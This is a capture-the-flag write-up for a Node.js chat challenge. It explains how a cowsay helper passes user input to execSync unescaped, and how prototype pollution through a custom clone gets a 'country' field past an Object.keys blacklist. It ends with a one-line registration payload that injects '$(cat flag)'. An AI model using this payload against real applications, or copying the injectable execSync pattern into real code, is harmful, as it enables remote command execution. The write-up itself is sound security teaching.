---
name: chat
category: web
points: 211
solves: 44
---

{% ignore %}
[Go to rendered GitBook version](https://sasdf.github.io/ctf/)
{% endignore %}

> We received a new gig.
> Our goal is to review this application written in nodejs and see if we can get the flag from this system.
> Are you up for this?

## Time
10 minutes

# Solution
## TL;DR
* Inject country field using proto pollution to get RCE.

## Vulnerability
When a user join a channel,
server will broadcast a ascii art created using cowsay.
The function getAscii has command injection vulnerability.
```javascript
helper.getAscii("User " + u + " living in " + c + " joined channel")
// ...
{
    getAscii: function(message) {
        var e = require('child_process');
        return e.execSync("cowsay '" + message + "'").toString();
    }
}
```
Where `u` is `name` and `c` is `country`.
They have a WAF for input:
```javascript
{
    validUser: function(inp) {
        var block = ["source","port","font","country",
                     "location","status","lastname"];
        if(typeof inp !== 'object') {
            return false;
        }

        var keys = Object.keys( inp);
        for(var i = 0; i< keys.length; i++) {
            key = keys[i];

            if(block.indexOf(key) !== -1) {
                return false;
            }
        }

        var r =/^[a-z0-9]+$/gi;
        if(inp.name === undefined || !r.test(inp.name)) {
            return false;
        }

        return true;
    }
}
```
They use `Object.keys` to blacklist some fields,
and use a custom clone function,
which is vulnerable to proto pollution.

Register with `{"name":"a","__proto__":{"country":"'$(cat flag)'"}}` to get the flag.

